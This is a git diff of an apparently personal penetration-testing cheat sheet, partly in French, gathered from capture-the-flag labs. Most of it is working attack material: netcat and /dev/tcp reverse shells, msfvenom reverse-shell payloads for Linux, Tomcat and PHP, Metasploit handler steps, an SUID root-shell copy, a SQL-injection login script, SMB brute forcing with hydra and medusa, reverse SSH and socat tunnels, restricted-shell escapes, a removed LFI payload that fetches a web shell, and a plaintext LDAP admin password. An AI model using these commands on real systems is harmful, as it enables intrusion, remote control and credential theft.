+    mkfifo /tmp/ffvdua; nc 192.168.0.13 443 0</tmp/ffvdua | /bin/sh >/tmp/ffvdua 2>&1; rm /tmp/ffvdua
+    
+    msfvenom -p cmd/unix/reverse_bash lhost <attacker_ip> lpost <port> R
+    0<&21-;exec 21<>/dev/tcp/192.168.0.13/443;sh <&21 >&21 2>&21
+    
+    msfvenom -p cmd/unix/reverse_netcat_gaping lhost=192.168.1.1 lport=443 R
+    nc 192.168.0.13 443 -e /bin/sh
+
+    msfvenom -l payloads | grep "cmd/unix" | awk '{print $1}'
+    cmd/unix/bind_awk
+    cmd/unix/bind_busybox_telnetd
+    cmd/unix/bind_inetd
+    cmd/unix/bind_jjs
+    cmd/unix/bind_lua
+    cmd/unix/bind_netcat
+    cmd/unix/bind_netcat_gaping
+    cmd/unix/bind_netcat_gaping_ipv6
+    cmd/unix/bind_nodejs
+    cmd/unix/bind_perl
+    cmd/unix/bind_perl_ipv6
+    cmd/unix/bind_r
+    cmd/unix/bind_ruby
+    cmd/unix/bind_ruby_ipv6
+    cmd/unix/bind_socat_udp
+    cmd/unix/bind_stub
+    cmd/unix/bind_zsh
+    cmd/unix/generic
+    cmd/unix/interact
+    cmd/unix/pingback_bind
+    cmd/unix/pingback_reverse
+    cmd/unix/reverse
+    cmd/unix/reverse_awk
+    cmd/unix/reverse_bash
+    cmd/unix/reverse_bash_telnet_ssl
+    cmd/unix/reverse_bash_udp
+    cmd/unix/reverse_jjs
+    cmd/unix/reverse_ksh
+    cmd/unix/reverse_lua
+    cmd/unix/reverse_ncat_ssl
+    cmd/unix/reverse_netcat
+    cmd/unix/reverse_netcat_gaping
+    cmd/unix/reverse_nodejs
+    cmd/unix/reverse_openssl
+    cmd/unix/reverse_perl
+    cmd/unix/reverse_perl_ssl
+    cmd/unix/reverse_php_ssl
+    cmd/unix/reverse_python
+    cmd/unix/reverse_python_ssl
+    cmd/unix/reverse_r
+    cmd/unix/reverse_ruby
+    cmd/unix/reverse_ruby_ssl
+    cmd/unix/reverse_socat_udp
+    cmd/unix/reverse_ssh
+    cmd/unix/reverse_ssl_double_telnet
+    cmd/unix/reverse_stub
+    cmd/unix/reverse_tclsh
+    cmd/unix/reverse_zsh
+
+
+
+# Metasploit
+
+
+
+# msfvenom
+
+    msfvenom -a x86 --platform linux -p linux/x86/exec -f py -b '\x0d\x0a\x00\xff' CMD=/bin/sh PrependSetresuid=true
+    msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o rev &>/dev/null
+    msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.20.128 LPORT=4444 -a x64 --platform linux -f elf -o rev
+    msfvenom --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.110.1 LPORT=4444 -f elf -a x86 -o rev
+
+    #Tomcat
+    msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.1 LPORT=1234 -f war > update.war
+    msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.20.128 LPORT=4444 -f war -o evil.war
+
+
+
+
+# Bash
+
+    $0 : Contient le nom du script tel qu'il a été invoqué
+    $1 : Le premier paramètre
+    $* : L'ensembles des paramètres sous la forme d'un seul argument
+    $@ : L'ensemble des arguments, un argument par paramètre
+    $# : Le nombre de paramètres passés au script
+    $? : Le code retour de la dernière commande
+    $$ : Le PID du shell qui exécute le script
+    $! : Le PID du dernier processus lancé en arrière-plan
+
+    echo $PATH
+    /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+    export PATH=/tmp:$PATH
+
+
+## Boucle imite command line
+
+```bash
 
 #!/bin/bash
 
@@ -403,7 +635,13 @@ do
 done < "/proc/${$}/fd/0"
 
 
-==authenticate + cookie + exploit
+```
+## Templates
+
+
+```bash
+
+#authenticate + cookie + exploit
 #!/bin/bash
 
 HOST=derpnstink.local
@@ -445,8 +683,10 @@ curl \
 # cleanup
 rm -rf cookie
 
+```
 
 
+```bash
 
 ##
 # Glasgow Smile 2 Authentication Script
@@ -491,12 +731,15 @@ curl -u user:password http://localhost/Glasgow---Smile2/
 # Send POST to you custom action URL. With the token in header "X-CSRF-Token: $token"
 #curl -H "X-CSRF-Token: $token" -b $cookie_path -c $cookie_path -d "$data" "$action_url" -s
 
+```
 
 
-=Python
 
 
-== read from sys.stdin
+# Python
+
+```python
+## read from sys.stdin
 
 import sys
 
@@ -507,7 +750,32 @@ for line in sys.stdin:
     print(f'Processing Message from sys.stdin *****{line}*****')
 print("Done")
 
-== input
+```
+
+
+```python
+# requests : post, get cookie
+import requests
+import string
+
+session = requests.Session()
+url = "http://888.darknet.com/"
+
+response = session.get(url)
+cookies = session.cookies.get_dict()
+
+data = {"username":"devnull' or '1", "password":"xxxxxxxx", "action":"Login"}
+r = session.post(url, data=data, cookies=cookies)
+url_main  = r.url
+r = requests.get(url_main, cookies=cookies)
+print (r.text)
+# cookies = session.cookies.get_dict()
+# print (cookies)
+
+
+```
+
+```python
 
 #!/usr/bin/python3
 import requests as req
@@ -524,50 +792,387 @@ while True:
     clean = re.sub('<?', '', stripped)
     print(clean)
 
+```
+
+```python
+# client
+#!/usr/bin/python
+
+from socket import *
+from time import *
+
+host = "127.0.0.1"
+port = int(1234)
+
+s = socket(AF_INET, SOCK_STREAM)
+s.connect((host, port))
+
+print s.recv(256)
+
+s.close() # close socket. be nice.
 
 
-== Extract code in html code
-sed -n '/<xxxxx/,/<\/xxxxx/p'
-sed -n '/<div id="footer"/,/<\/div/p'
-sed 's/^@\(.*\)/\1/' # delete @ at the begining of lines
+```
 
 
-==nmap
+```python
+# server
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
+
+s.bind(("0.0.0.0", 4444))
+s.listen(10)
+
+cSock, addr = s.accept()
+handler(cSock, addr)
+
+```
+
+
+```python
+# read file
+import sys
+
+thisdict = {}
+
+f = open("words.txt", "r")
+lines = f.readlines()
+for line in lines:
+        line = line.strip()
+        line_sorted = "".join(sorted(line))
+        # print("{} : {} : {}".format(count, line, line_sorted))
+        thisdict[line_sorted] = line
+
+```
+```python
+# read file
+with open('passwd.txt',encoding='utf-8', mode='r') as f:
+    raw_words = f.read()
+
+for w in raw_words.split():
+    w = w.strip()
+
+```
 
 
 
-==Steganography
+```python
+# set suid
+import os; os.system('cp /bin/sh /tmp/sh');   os.system('chown root.root /tmp/sh'); os.system('chmod 4755 /tmp/sh');
 
-exiftool
-steghide
-    steghide embed -ef <txt filename> -cf <media filename>
-    steghide extract -sf <media filename>
-    steghide embed -ef <txt filename> -cf <media filename> -p  <password>
-    steghide info <media filename>
- stepic -d -i kvasir.png | xxd -p -r > k.png
-
-==wordslist
-
-SecList
-Rockyou
-nmap
+```
 
 
-==Generate password for /etc/passwd
-https://unix.stackexchange.com/questions/81240/manually-generate-password-for-etc-shadow
+# Generate password
 
-openssl passwd -6 -salt xyz  yourpass
-    -1 : MD5 password,
-    -5 a SHA256 
-    -6 SHA512 
-mkpasswd --method=SHA-512 --stdin
-    --method=md5
-    --method=sha-256
-    --method=sha-512
+    #1 /etc/passwd
+    https://unix.stackexchange.com/questions/81240/manually-generate-password-for-etc-shadow
 
-===visudo
+    openssl passwd -6 -salt <xyz>  <yourpass>
+        -1 : MD5 password,
+        -5 : SHA256 
+        -6 : SHA512 
+
+    mkpasswd --method=SHA-512 --stdin
+        --method=md5
+        --method=sha-256
+        --method=sha-512
+
+    #2 Wordpress
+    $P$BZ9cvCg4NZMOtHvOEhxws.wSX6/OX7. : 123456
+
+# visudo
 
 bttai   ALL=(ALL) NOPASSWD: ALL
+
+
+# SMB
+
+https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/
+
+enum4linux 192.168.110.46
+nmblookup -A 192.168.1.17
+nbtscan 192.168.1.17
+nbtstat -A 192.168.1.17
+smbmap -H 192.168.110.46
+smbmap -H 192.168.110.46 -u helios -p qwerty
+rcpclient
+
+smbclient -L 192.168.110.46
+smbclient //192.168.110.46/helios
+get file.txt
+
+smbclient //10.10.10.9/share$
+
+
+smbclient //192.168.110.46/helios -U helios
+Enter WORKGROUP\helios's password: 
+Try "help" to get a list of possible commands.
+smb: \> ls
+smb: \> mask ""
+smb: \> recurse ON
+smb: \> prompt OFF
+smb: \> mget *
+
+
+## SMB Password Cracking
+
+https://www.hackingarticles.in/password-crackingsmb/
+hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.118 smb
+hydra -e nsr -u -l <username> -P passwd.txt 192.168.1.105 smb -V -f
+
+ncrack –U /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.118 –p 445
+
+medusa -h 192.168.1.118 -U /root/Desktop/user.txt -P /root/Desktop/pass.txt -M smbnt
+medusa -u <username> -P passwd.txt -h 192.168.1.105 -M smbnt
+
+Metasploit
+
+use auxiliary/scanner/smb/smb_login
+msf exploit (smb_login)>set rhosts 192.168.1.118
+msf exploit (smb_login)>set user_file /root/Desktop/user.txt
+msf exploit (smb_login)>set pass_file /root/Desktop/pass.txt
+msf exploit (smb_login)>set stop_on_success true
+msf exploit (smb_login)>exploit
+
+# NFS
+
+showmount : liste les partages, mountables anonymement
+
+# SMTP 
+
+detecte des nom d'utilisateurs ?
+
+# Base de données
+
+sqlmap
+
+# SNMP (UDP 161) 
+
+snmpwalk
+
+# LDAP
+
+
+ldapsearch -x -LLL -h 192.168.110.51 -D 'cn=admin,dc=symfonos,dc=local' -w 'qMDdyZh3cT6eeAWD' -b 'dc=symfonos,dc=local'
+nmap 192.168.110.51 -p 389 --script ldap-search --script-args 'ldap.username="cn=admin,dc=symfonos,dc=local", ldap.password="qMDdyZh3cT6eeAWD"' 
+
+# Transfert de fichiers
+
+## with nc
+
+    #reciever
+    nc -l -p 1234 -q 1 > archive.tar.gz < /dev/null
+    nc -l -p 1234 -q 1 | uncompress -c | tar xvfp -
+    nc -l -p 1234  -q 1 | gunzip > asroot
+    nc -l -p 1234  -q 1 | tar zxv
+    nc 10.0.1.1 1234 > linpeas.sh
+
+    #sender
+    cat archive.tar.gz | nc a.b.c.d 1234
+    tar cfp - /some/dir | compress -c |  nc a.b.c.d 1234
+    gzip -c /tmp/asroot | nc a.b.c.d 1234
+    tar czp /tmp/directory | nc a.b.c.d 1234
+    nc -l -p 1234 -q 1 < linpeas.sh 
+
+## transfer file xxd, base64
+    
+    xxd -p -c 36 binary
+    cat binary.xxd | xxd -r -p > binary
+
+    base64 -w 0 binary
+    echo -ne f0VMRgEBAQAAAAAAAAAAAAIAAwABA... | base64 -d > binary
+
+
+
+# Version 
+
+    uname -a
+    lsb_release -a
+    cat /etc/release
+    cat /etc/*release
+    cat /etc/issue
+    cat /etc/os-release
+    hostnamectl
+
+# Spawning a TTY Shell
+
+    python -c 'import pty; pty.spawn("/bin/sh")'
+    echo os.system('/bin/bash')
+    /bin/sh -i
+    perl -e 'exec "/bin/sh";'
+    perl - exec "/bin/sh";
+    ruby - exec "/bin/sh"
+    lua - os.execute('/bin/sh')
+    IRB - exec "/bin/sh"
+    vi - :!bash
+    vi - :set shell=/bin/bash:shell
+    nmap - !sh
+
+
+
+# knock port
+
+    for p in 4000 5000 6000; do nmap -Pn --host-timeout 201 --max-retries 0 -p $p <victime_ip>; done
+    for p in 7000 8000 9000; do nc -vz <victime_ip> $p; done
+
+
+https://github.com/grongor/knock/blob/master/knock
+
+
+# Display available network interfaces
+
+    ip link show
+    nmcli device status / nmcli connection show
+    netstat -i
+    netstat -antp | grep 1234
+    netstat -lnp tcp
+
+    ifconfig -a
+
+# Routing table
+    
+    ip r
+
+# ARP cache
+
+    arp 
+    arp -a
+    arp -e
+    arp -n
+
+# Crypt - uncrypt
+
+    https://hashes.com/en/decrypt/hash
+    cyberchef : gchq.github.io
+    http://rumkin.com/tools
+
+
+## ROT13
+
+```console
+
+ tr 'A-Za-z' 'N-ZA-Mn-za-m'
+
+```
+
+
+
+=== Write in some sensitive file
+find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq
+
+for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
+
+
+=== Server
+python3 -m http.server 8888 --directory /home/kali/OSPC/Tools/
+
+
+=== Check privilegessocat TCP-LISTEN:1234,reuseaddr,for
+
+http://www.securitysift.com/download/linuxprivchecker.py
+https://github.com/cervoise/linuxprivcheck
+https://github.com/rebootuser
+
+# Port forwarding 
+
+## socat TCP redirection
+
+    1) attacker listen on port 443 and 2222
+    sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr    
+    
+    2) victim connect to <attacker_ip> on the port 443 and traffic redirection to the local port 22
+    while true; do socat TCP4:<attacker_ip>:443 TCP4:127.0.0.1:22 ; done
+    
+    3) attacker connect to the port 2222 wich redirect to the remote port 22
+    ssh localhost -p 2222 -i key
+
+
+
+## SSH
+
+    # attacker's machine
+    ssh -N -f -L 8080:internalTarget:80 user@<victim_ip>
+    ssh -N -f -L 2222:internalTarget:22 user@<victim_ip>
+
+    # victim's machine
+    # ssh-keygen -P "" -f key
+    ssh -N -f -R 2222:internalTarget:22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null kali@<attacker_ip> -i key 2>&1
+    
+
+## Meterpreter session
+
+    portfwd add -l 3306 -p 3306 -r 172.28.128.3
+    portfwd list
+    portfwd flush
+
+
+
+
+
+
+# Obtient a meterpreter session
+
+    # netcat
+    msf6 > use exploit/multi/handler
+    msf6 exploit(multi/handler) > set lhost 192.168.0.13
+    msf6 exploit(multi/handler) > set payload generic/shell_reverse_tcp
+    # or
+    msf6 exploit(multi/handler) > set payload linux/x86/shell_reverse_tcp
+    msf6 exploit(multi/handler) > run
+
+    nc 192.168.0.13 4444 -e /bin/sh
+    
+    ^Z
+    Background session 1? [y/N]  y
+    msf6 exploit(multi/handler) > sessions  -u 1
+    msf6 exploit(multi/handler) > sessions 2
+
+    # msfvenom binary
+    msfvenom --platform linux --arch x86 --payload linux/x86/meterpreter/reverse_tcp LHOST=192.168.110.1 LPORT=4444 --format elf --out rev
+
+    msf6 > use exploit/multi/handler 
+    msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
+    msf6 exploit(multi/handler) > set LHOST 192.168.110.1
+    msf6 exploit(multi/handler) > run
+
+
+    # msfvenom php
+
+    msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.110.1 LPORT=4444 -f raw -o rev.php
+    php -f /tmp/rev.php
+    curl http://<victim_ip>/rev.php
+
+    msf6 > use exploit/multi/handler 
+    msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
+    msf6 exploit(multi/handler) > set LHOST 192.168.110.1
+    msf6 exploit(multi/handler) > run
+
+
+
+
+# Escape jail
+
+https://book.hacktricks.xyz/linux-unix/privilege-escalation/escaping-from-limited-bash
+
+- rbash : ssh avida@192.168.110.38 -t "/bin/bash --noprofile"
+- ftp : 
+    -rbash-4.1$ ftp 
+    ftp> !
+    +rbash-4.1$ /bin/bash
+- nano :
+    nano -s /bin/bash
+    /bin/bash
+    ^T
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+export SHELL=/bin/bash
+
+
+
+
+# Bordel
 
 
 
@@ -620,61 +1225,8 @@ gdb-peda$ find "\xff\xd4" binary
 
 gdb-peda$ find "\xff\xe4" binary
 
-=== Local File Inclusion (LFI) Scan & Exploit Tool (@hc0d3r - P0cL4bs Team)
-https://highon.coffee/blog/lfi-cheat-sheet/
-
-Path Traversal aka Directory Traversal
-    /etc/passwd
-    ../../../etc/passwd
-PHP Wrapper expect:// LFI
-    http://127.0.0.1/fileincl/example1.php?page=expect://ls
-
-PHP Wrapper php://input
-    http://192.168.183.128/fileincl/example1.php?page=php://input
-    post data payload : <? system('uname -a');?>
-                        <? system('wget http://192.168.183.129/php-reverse-shell.php -O /var/www/shell.php');?>
-
-PHP Wrapper php://filter
-    http://192.168.155.131/fileincl/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
-
-/proc/self/environ LFI Method
-/proc/self/fd/ LFI Method
-
-https://tools.kali.org/web-applications/uniscan
-sudo uniscan
 
 
-
-
-
-===Identifier les méthodes HTTP autorisées
-
-
-curl -X OPTIONS http://example.org -i
-
-
-
-===tcpdump
-
-sudo tcpdump -i vboxnet0 icmp -X
-
-https://danielmiessler.com/study/tcpdump/
-
-
-===Escape jail
-
-https://book.hacktricks.xyz/linux-unix/privilege-escalation/escaping-from-limited-bash
-- rbash : ssh avida@192.168.110.38 -t "/bin/bash --noprofile"
-- ftp : 
-    -rbash-4.1$ ftp 
-    ftp> !
-    +rbash-4.1$ /bin/bash
-- nano :
-    nano -s /bin/bash
-    /bin/bash
-    ^T
-export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
-export SHELL=/bin/bash
 
 
 
@@ -754,12 +1306,8 @@ print input11
 ```
 
 
-= GIT
-== List of current files on git directory
-git ls-tree -r master --name-only
 
-
-= Buffers overflow
+# Buffers overflow
 
 https://guif.re/bo
 
@@ -779,88 +1327,7 @@ gdb-peda$ find "\xff\xe4" binary
 
 
 
-= Scan IP
-
-#!/bin/bash
-TF=$(mktemp -u)
-touch $TF
-is_alive_ping()
-{
-  ping -c 1 $1 > /dev/null
-  [ $? -eq 0 ] && echo Node with IP: $i is up. >> $TF
-}
-
-for i in 192.168.0.{1..254} 
-do
-is_alive_ping $i & disown
-done
-sleep 1
-cat $TF
-rm $TF
-
- == Scan ports
-
- for i in $(seq 1 65535); do nc -z -v 192.168.3.50 $i 2>&1 | grep 'open'; done
-
-
-
-==ROT13
-
-```console
-
- tr 'A-Za-z' 'N-ZA-Mn-za-m'
-
-```
-
-
-== SED
-
-```console
-
-sed 's/<pre>/<pre>\n/g' 
-
-```
-
-Garder seuelement le texte entre <pre> text </pre>
-
-```console
-
-sed -e 's/<[^>]*>//g'
-
-```
-Supprimer toutes les balises
-
-
-```console
-
-sed -r -e '1d' -e '$d' -e 's/^\s+//'
-
-```
-
-Supprimer la première ligne et la dernière ligne
 
 
 
 
-## scan ports
-
-for i in $(seq 1 65535); do nc -z -v 192.168.2.200 $i 2>&1 | grep 'open'; done
-
-
-
-
-==
-find  /home -name ".bash_history" 2>/dev/null -exec cat {} \;
-
-
-
-===LDAP
-
-ldapsearch -x -LLL -h 192.168.110.51 -D 'cn=admin,dc=symfonos,dc=local' -w 'qMDdyZh3cT6eeAWD' -b 'dc=symfonos,dc=local'
-nmap 192.168.110.51 -p 389 --script ldap-search --script-args 'ldap.username="cn=admin,dc=symfonos,dc=local", ldap.password="qMDdyZh3cT6eeAWD"' 
-
-
-
-=== Peut-être
-for file in $(find . -name '*.php'); do cat $file; done
-grep -Er '(preg_replace|phpinfo()|system)' * | grep '.php:'
